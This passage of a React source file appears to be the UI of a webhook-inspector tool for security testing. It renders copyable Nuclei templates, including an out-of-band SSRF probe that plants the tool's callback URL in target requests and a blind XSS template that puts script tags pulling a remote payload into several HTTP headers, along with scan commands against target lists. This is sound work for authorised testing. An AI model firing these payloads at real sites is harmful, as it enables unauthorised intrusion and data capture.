                          padding: '12px 14px', 
                          gap: '12px' 
                        }}
                      >
                        <span 
                          style={{ 
                            color: 'var(--text-main)', 
                            fontFamily: 'monospace', 
                            fontSize: '0.82rem', 
                            fontWeight: '600', 
                            flex: 1, 
                            whiteSpace: 'nowrap', 
                            overflowX: 'auto',
                            paddingBottom: '2px'
                          }}
                        >
                          {generatedCmd}
                        </span>
                        <button 
                          onClick={() => handleCopy(generatedCmd, 'builder-cmd')}
                          className="btn-secondary"
                          style={{ flexShrink: '0', padding: '6px 12px', fontSize: '0.75rem' }}
                        >
                          {copiedText === 'builder-cmd' ? (
                            <span style={{ display: 'flex', alignItems: 'center', gap: '6px', color: 'var(--color-success)' }}>
                              <Check size={13} /> Copied
                            </span>
                          ) : (
                            <span style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                              <Copy size={13} /> Copy
                            </span>
                          )}
                        </button>
                      </div>
                    );
                  })()}
                </div>
              )}

              {/* 2. OOB SSRF & RCE TEMPLATE */}
              {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'OOB_SSRF') && (
                <section style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '8px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <Zap size={16} style={{ color: 'var(--color-primary)' }} />
                      <h3 style={{ fontSize: '0.9rem', fontWeight: '700', color: 'var(--text-main)', margin: 0 }}>
                        1. Out-of-Band (OOB) SSRF / RCE Nuclei Template
                      </h3>
                    </div>
                    <span className="badge badge-info" style={{ fontSize: '0.65rem' }}>Auto-Configured for /api/r/{id}</span>
                  </div>

                  <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', lineHeight: '1.5', margin: 0 }}>
                    Use this custom template to trigger HTTP/SSRF callbacks from the target application. Any inbound request will be logged under the <strong>OOB</strong> tab of this dashboard.
                  </p>

                  {(() => {
                    const ssrfTemplateCode = `id: inspector-ssrf-oob

info:
  name: Out-of-Band SSRF Detection via Webhook Inspector
  author: robbypranata
  severity: high
  description: Triggers outbound HTTP callbacks to your active Webhook Inspector endpoint.
  tags: ssrf,oob,blind

variables:
  oob_callback: "${webhookUrl}"

http:
  - raw:
      - |
        GET /api/fetch?url={{oob_callback}}?source=nuclei_get&target={{Hostname}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)

      - |
        POST /webhook/trigger HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"callback_url": "{{oob_callback}}?source=nuclei_post", "host": "{{Hostname}}"}

    stop-at-first-match: true`;

                    return (
                      <div style={{ position: 'relative', background: 'var(--bg-surface)', border: '1px solid var(--border-light)', borderRadius: 'var(--radius-sm)', overflow: 'hidden' }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 14px', background: 'var(--bg-input)', borderBottom: '1px solid var(--border-light)' }}>
                          <span style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)', fontFamily: 'monospace' }}>
                            inspector-ssrf-oob.yaml
                          </span>
                          <button
                            onClick={() => handleCopy(ssrfTemplateCode, 'ssrf-yaml')}
                            className={styles.copyBtn}
                          >
                            {copiedText === 'ssrf-yaml' ? <><Check size={13} style={{ color: 'var(--color-success)' }} /> Copied</> : <><Copy size={13} /> Copy</>}
                          </button>
                        </div>
                        <pre style={{ padding: '14px', margin: 0, fontSize: '0.8rem', fontFamily: 'monospace', color: 'var(--text-main)', overflowX: 'auto', lineHeight: '1.5' }}>
                          {ssrfTemplateCode}
                        </pre>
                      </div>
                    );
                  })()}
                </section>
              )}

              {/* 3. BLIND XSS HEADER FUZZER */}
              {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'BLIND_XSS') && (
                <section style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '8px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <ShieldAlert size={16} style={{ color: 'var(--color-primary)' }} />
                      <h3 style={{ fontSize: '0.9rem', fontWeight: '700', color: 'var(--text-main)', margin: 0 }}>
                        2. Blind XSS Header & Parameter Fuzzer Template
                      </h3>
                    </div>
                    <span className="badge badge-neutral" style={{ fontSize: '0.65rem' }}>
                      Auto-Configured for /api/x?id={id}
                    </span>
                  </div>

                  <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', lineHeight: '1.5', margin: 0 }}>
                    Injects your Blind XSS payload into standard HTTP request headers. When rendered in an admin panel or browser, the script triggers and captures environment details under your <strong>XSS</strong> tab.
                  </p>

                  {(() => {
                    const xssTemplateCode = `id: inspector-blind-xss

info:
  name: Blind XSS Probe Injection via Webhook Inspector
  author: robbypranata
  severity: medium
  tags: xss,blind-xss,oob

http:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/contact"
      - "{{BaseURL}}/feedback"
      - "{{BaseURL}}/support"

    headers:
      User-Agent: '"><script src="${xssPayloadUrl}"></script>'
      X-Forwarded-For: '"><script src="${xssPayloadUrl}"></script>'
      Referer: '"><script src="${xssPayloadUrl}"></script>'
      X-Client-IP: '"><script src="${xssPayloadUrl}"></script>'
      Contact-Email: 'test"><script src="${xssPayloadUrl}"></script>'`;

                    return (
                      <div style={{ position: 'relative', background: 'var(--bg-surface)', border: '1px solid var(--border-light)', borderRadius: 'var(--radius-sm)', overflow: 'hidden' }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 14px', background: 'var(--bg-input)', borderBottom: '1px solid var(--border-light)' }}>
                          <span style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)', fontFamily: 'monospace' }}>
                            inspector-blind-xss.yaml
                          </span>
                          <button
                            onClick={() => handleCopy(xssTemplateCode, 'xss-yaml')}
                            className={styles.copyBtn}
                          >
                            {copiedText === 'xss-yaml' ? <><Check size={13} style={{ color: 'var(--color-success)' }} /> Copied</> : <><Copy size={13} /> Copy</>}
                          </button>
                        </div>
                        <pre style={{ padding: '14px', margin: 0, fontSize: '0.8rem', fontFamily: 'monospace', color: 'var(--text-main)', overflowX: 'auto', lineHeight: '1.5' }}>
                          {xssTemplateCode}
                        </pre>
                      </div>
                    );
                  })()}
                </section>
              )}

              {/* 4. REALTIME SCAN WEBHOOK REPORTING */}
              {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'REPORTING') && (
                <section style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '8px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <Radio size={16} style={{ color: 'var(--color-primary)' }} />
                      <h3 style={{ fontSize: '0.9rem', fontWeight: '700', color: 'var(--text-main)', margin: 0 }}>
                        3. Stream Findings via Webhook
                      </h3>
                    </div>
                    <span className="badge badge-warning" style={{ fontSize: '0.65rem' }}>
                      Real-time JSON Stream
                    </span>
                  </div>

                  <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', lineHeight: '1.5', margin: 0 }}>
                    Configure Nuclei to forward findings directly to this listener endpoint in real-time as vulnerabilities are discovered.
                  </p>

                  {(() => {
                    const reportConfig = `# reporting-config.yaml
webhook:
  - id: webhook-inspector-receiver
    server-url: "${webhookUrl}?src=nuclei_report"
    username: ""
    password: ""`;

                    return (
                      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '14px' }}>
                        <div style={{ background: 'var(--bg-surface)', border: '1px solid var(--border-light)', borderRadius: 'var(--radius-sm)', overflow: 'hidden' }}>
                          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '8px 14px', background: 'var(--bg-input)', borderBottom: '1px solid var(--border-light)' }}>
                            <span style={{ fontSize: '0.72rem', fontWeight: '600', color: 'var(--text-secondary)', fontFamily: 'monospace' }}>
                              reporting-config.yaml
                            </span>
                            <button
                              onClick={() => handleCopy(reportConfig, 'report-yaml')}
                              className={styles.copyBtn}
                            >
                              {copiedText === 'report-yaml' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                            </button>
                          </div>
                          <pre style={{ padding: '14px', margin: 0, fontSize: '0.8rem', fontFamily: 'monospace', color: 'var(--text-main)', overflowX: 'auto', lineHeight: '1.5' }}>
                            {reportConfig}
                          </pre>
                        </div>

                        <div style={{ padding: '16px', background: 'var(--bg-surface)', border: '1px solid var(--border-light)', borderRadius: 'var(--radius-sm)', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                          <span style={{ fontSize: '0.78rem', fontWeight: '600', color: 'var(--text-main)' }}>CLI Execution Command</span>
                          <div style={{ display: 'flex', alignItems: 'center', background: 'var(--bg-input)', padding: '10px 12px', borderRadius: 'var(--radius-xs)', border: '1px solid var(--border-light)', gap: '8px' }}>
                            <code style={{ fontSize: '0.78rem', color: 'var(--text-main)', flex: 1, overflowX: 'auto', whiteSpace: 'nowrap' }}>
                              nuclei -u https://target.com -t cves/ -report-config reporting-config.yaml
                            </code>
                            <button 
                              onClick={() => handleCopy('nuclei -u https://target.com -t cves/ -report-config reporting-config.yaml', 'report-cmd')}
                              className={styles.copyBtn}
                            >
                              {copiedText === 'report-cmd' ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                            </button>
                          </div>
                          <p style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', margin: 0 }}>
                            Findings will stream into your <strong>OOB</strong> tab with vulnerability details and payload context.
                          </p>
                        </div>
                      </div>
                    );
                  })()}
                </section>
              )}

              {/* 5. LOCAL COMMUNITY TEMPLATES REPOSITORY GUIDE */}
              {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'COMMUNITY') && (
                <section style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', borderBottom: '1px solid var(--border-light)', paddingBottom: '8px' }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                      <Database size={16} style={{ color: 'var(--color-primary)' }} />
                      <h3 style={{ fontSize: '0.9rem', fontWeight: '700', color: 'var(--text-main)', margin: 0 }}>
                        4. Scanning Presets
                      </h3>
                    </div>
                    <span className="badge badge-neutral" style={{ fontSize: '0.65rem' }}>C:\templates\</span>
                  </div>

                  <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', lineHeight: '1.5', margin: 0 }}>
                    Execute targeted scans using curated community template collections:
                  </p>

                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(300px, 1fr))', gap: '12px' }}>
                    {[
                      {
                        title: 'Critical & High Severity Recon',
                        desc: 'Executes community templates filtered to critical and high severity.',
                        cmd: 'nuclei -u https://target.com -t C:\\templates\\ -s critical,high'
                      },
                      {
                        title: 'WordPress Wordfence CVEs',
                        desc: 'Scans WordPress installations for known plugin and theme vulnerabilities.',
                        cmd: 'nuclei -u https://target.com -t C:\\templates\\topscoder_nuclei-wordfence-cve\\'
                      },
                      {
                        title: 'Rate-Limited Parameter Fuzzing',
                        desc: 'Fuzzes parameters with controlled rate limits to avoid server throttling.',
                        cmd: 'nuclei -u https://target.com -t C:\\templates\\projectdiscovery_fuzzing-templates\\ -rl 30 -c 10'
                      },
                      {
                        title: 'Multi-Target Reconnaissance',
                        desc: 'Scans an entire list of discovered targets from a file.',
                        cmd: 'nuclei -l targets.txt -t C:\\templates\\ -s critical,high -rl 50 -c 25'
                      }
                    ].map((recipe, idx) => (
                      <div 
                        key={idx}
                        style={{
                          padding: '14px',
                          background: 'var(--bg-surface)',
                          border: '1px solid var(--border-light)',
                          borderRadius: 'var(--radius-sm)',
                          display: 'flex',
                          flexDirection: 'column',
                          gap: '8px'
                        }}
                      >
                        <span style={{ fontSize: '0.8rem', fontWeight: '600', color: 'var(--text-main)' }}>
                          {recipe.title}
                        </span>
                        <div style={{ display: 'flex', alignItems: 'center', background: 'var(--bg-input)', padding: '8px 12px', borderRadius: 'var(--radius-xs)', border: '1px solid var(--border-light)', gap: '8px' }}>
                          <code style={{ fontSize: '0.75rem', color: 'var(--text-main)', flex: 1, overflowX: 'auto', whiteSpace: 'nowrap' }}>
                            {recipe.cmd}
                          </code>
                          <button 
                            onClick={() => handleCopy(recipe.cmd, `recipe-${idx}`)}
                            className={styles.copyBtn}
                          >
                            {copiedText === `recipe-${idx}` ? <Check size={13} style={{ color: 'var(--color-success)' }} /> : <Copy size={13} />}
                          </button>
                        </div>
                        <p style={{ fontSize: '0.72rem', color: 'var(--text-secondary)', margin: 0 }}>
                          {recipe.desc}
                        </p>
                      </div>
                    ))}
                  </div>
                </section>
              )}

              {/* 6. CLI QUICK CHEATSHEET */}
              {(selectedNucleiSection === 'ALL' || selectedNucleiSection === 'CHEATSHEET') && (
                <section style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px', borderBottom: '1px solid var(--border-light)', paddingBottom: '8px' }}>
                    <BookOpen size={16} style={{ color: 'var(--color-primary)' }} />
                    <h3 style={{ fontSize: '0.9rem', fontWeight: '700', color: 'var(--text-main)', margin: 0 }}>
                      5. Essential CLI Flags
                    </h3>
                  </div>

                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))', gap: '10px' }}>
                    {[
                      { flag: '-u, -target <url>', desc: 'Target URL to scan' },
                      { flag: '-l, -list <file>', desc: 'Path to list of target URLs' },
                      { flag: '-t, -templates <path>', desc: 'Template or directory to execute' },
                      { flag: '-s, -severity <level>', desc: 'Filter templates: info, low, medium, high, critical' },
                      { flag: '-tags <tags>', desc: 'Filter templates by tag (e.g. ssrf, xss, cve)' },
                      { flag: '-var <key=val>', desc: 'Pass custom variable to templates' },
                      { flag: '-rl, -rate-limit <n>', desc: 'Maximum requests per second' },
                      { flag: '-c, -concurrency <n>', desc: 'Maximum concurrent templates' },
                      { flag: '-report-config <file>', desc: 'Send scan alerts/findings to Webhook Inspector' },
                      { flag: '-tl', desc: 'List available templates without executing' }
                    ].map((item, idx) => (
                      <div 
                        key={idx}
                        style={{
                          padding: '10px 12px',
                          background: 'var(--bg-surface)',
                          border: '1px solid var(--border-light)',
                          borderRadius: 'var(--radius-xs)',
                          display: 'flex',
                          flexDirection: 'column',
                          gap: '3px'
                        }}
                      >
                        <code style={{ fontSize: '0.78rem', color: 'var(--text-main)', fontWeight: '600' }}>{item.flag}</code>
                        <span style={{ fontSize: '0.72rem', color: 'var(--text-secondary)' }}>{item.desc}</span>
                      </div>
                    ))}
                  </div>
                </section>
              )}

            </div>

          </div>
        )}

      </main>

      {/* MODAL CONFIG CUSTOM RESPONSE */}
      {isConfigOpen && (
        <div className={styles.configModal}>
          <form onSubmit={handleSaveConfig} className={`${styles.configCard} glass-panel animate-fade-in`}>
            <div className={styles.configHeader}>
              <h3 className={styles.configTitle}>
                <Settings size={18} className={styles.logoIcon} />
                Endpoint Settings
              </h3>
              <button 
                type="button" 
                onClick={() => setIsConfigOpen(false)}
                className={styles.copyBtn}
                style={{ fontSize: '1.1rem', padding: '4px 8px' }}
              >
                ✕
              </button>
            </div>

            <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginTop: '-8px' }}>
              Configure the HTTP status, headers, and body returned when incoming webhook requests hit this endpoint.
            </p>

            <div className={styles.configGrid}>
              <div className={styles.configField}>
                <label className={styles.fieldLabel}>HTTP Status Code</label>
                <select 
                  value={configStatus} 
                  onChange={(e) => setConfigStatus(e.target.value)}
                  className={styles.selectField}
                >
                  <option value="200">200 OK</option>
                  <option value="201">201 Created</option>
                  <option value="202">202 Accepted</option>
                  <option value="204">204 No Content</option>
                  <option value="301">301 Moved Permanently</option>
                  <option value="302">302 Found</option>
                  <option value="400">400 Bad Request</option>
                  <option value="401">401 Unauthorized</option>
                  <option value="403">403 Forbidden</option>
                  <option value="404">404 Not Found</option>
                  <option value="500">500 Internal Server Error</option>
                  <option value="503">503 Service Unavailable</option>
                </select>
              </div>

              <div className={styles.configField}>
                <label className={styles.fieldLabel}>Content-Type Header</label>
                <select 
                  value={configContentType} 
                  onChange={(e) => setConfigContentType(e.target.value)}
                  className={styles.selectField}
                >
                  <option value="application/json">application/json</option>
                  <option value="text/plain">text/plain</option>
                  <option value="text/html">text/html</option>
                  <option value="application/xml">application/xml</option>
                </select>
              </div>

              <div className={styles.configFieldFull}>
                <label className={styles.fieldLabel}>Response Body</label>
                <textarea 
                  placeholder={configContentType === 'application/json' ? '{"success": true}' : 'Response body...'}
                  value={configBody}
                  onChange={(e) => setConfigBody(e.target.value)}
                  className={styles.textareaField}
                />
              </div>
            </div>

            {/* Real-time Notifications Section */}
            <div style={{ borderTop: '1px solid var(--border-light)', paddingTop: '16px', marginTop: '8px' }}>
              <h4 style={{ fontSize: '0.8rem', fontWeight: '600', color: 'var(--text-main)', display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '14px' }}>
                <Radio size={14} style={{ color: 'var(--color-primary)' }} />
                Real-Time Alert Integrations
              </h4>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))', gap: '16px' }}>
                {/* Telegram Alert Block */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', padding: '14px', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-light)', background: 'var(--bg-surface)' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <input 
                      type="checkbox" 
                      id="telegram_enabled"
                      checked={configTelegramEnabled} 
                      onChange={(e) => setConfigTelegramEnabled(e.target.checked)}
                      style={{ cursor: 'pointer', width: '15px', height: '15px', accentColor: 'var(--color-primary)' }}
                    />
                    <label htmlFor="telegram_enabled" style={{ fontSize: '0.8rem', fontWeight: '600', color: 'var(--text-main)', cursor: 'pointer' }}>
                      Telegram Alerts
                    </label>
                  </div>
                  
                  {configTelegramEnabled && (
                    <div className="animate-fade-in" style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginTop: '4px' }}>
                      <div className={styles.configField}>
                        <label className={styles.fieldLabel} style={{ fontSize: '0.68rem' }}>Bot Token</label>
                        <input 
                          type="password"
                          placeholder="123456789:ABCdef..."
                          value={configTelegramToken}
                          onChange={(e) => setConfigTelegramToken(e.target.value)}
                          className={styles.inputField}
                          style={{ fontSize: '0.75rem', padding: '6px 10px' }}
                        />
                      </div>
                      <div className={styles.configField}>
                        <label className={styles.fieldLabel} style={{ fontSize: '0.68rem' }}>Chat ID</label>
                        <input 
                          type="text"
                          placeholder="-100123456789"
                          value={configTelegramChatId}
                          onChange={(e) => setConfigTelegramChatId(e.target.value)}
                          className={styles.inputField}
                          style={{ fontSize: '0.75rem', padding: '6px 10px' }}
                        />
                      </div>
                    </div>
                  )}
                </div>

                {/* Discord Alert Block */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', padding: '14px', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-light)', background: 'var(--bg-surface)' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                    <input 
                      type="checkbox" 
                      id="discord_enabled"
                      checked={configDiscordEnabled} 
                      onChange={(e) => setConfigDiscordEnabled(e.target.checked)}
                      style={{ cursor: 'pointer', width: '15px', height: '15px', accentColor: 'var(--color-primary)' }}
                    />
                    <label htmlFor="discord_enabled" style={{ fontSize: '0.8rem', fontWeight: '600', color: 'var(--text-main)', cursor: 'pointer' }}>
                      Discord Alerts
                    </label>
                  </div>

                  {configDiscordEnabled && (
                    <div className="animate-fade-in" style={{ display: 'flex', flexDirection: 'column', gap: '8px', marginTop: '4px' }}>
                      <div className={styles.configField}>
                        <label className={styles.fieldLabel} style={{ fontSize: '0.68rem' }}>Webhook URL</label>
                        <input 
                          type="password"
                          placeholder="https://discord.com/api/webhooks/..."
                          value={configDiscordWebhook}
                          onChange={(e) => setConfigDiscordWebhook(e.target.value)}
                          className={styles.inputField}
                          style={{ fontSize: '0.75rem', padding: '6px 10px' }}
                        />
                      </div>
                    </div>
                  )}
                </div>
              </div>
            </div>

            <div className={styles.configActions}>
              <button 
                type="button" 
                onClick={() => setIsConfigOpen(false)}
                className="btn-secondary"
                style={{ padding: '8px 16px', fontSize: '0.82rem' }}
              >
                Cancel
              </button>
              <button 
                type="submit" 
                className="btn-primary"
                style={{ padding: '8px 18px', fontSize: '0.82rem' }}
              >
                Save Settings
              </button>
            </div>
          </form>
        </div>
      )}

    </div>
  );
}
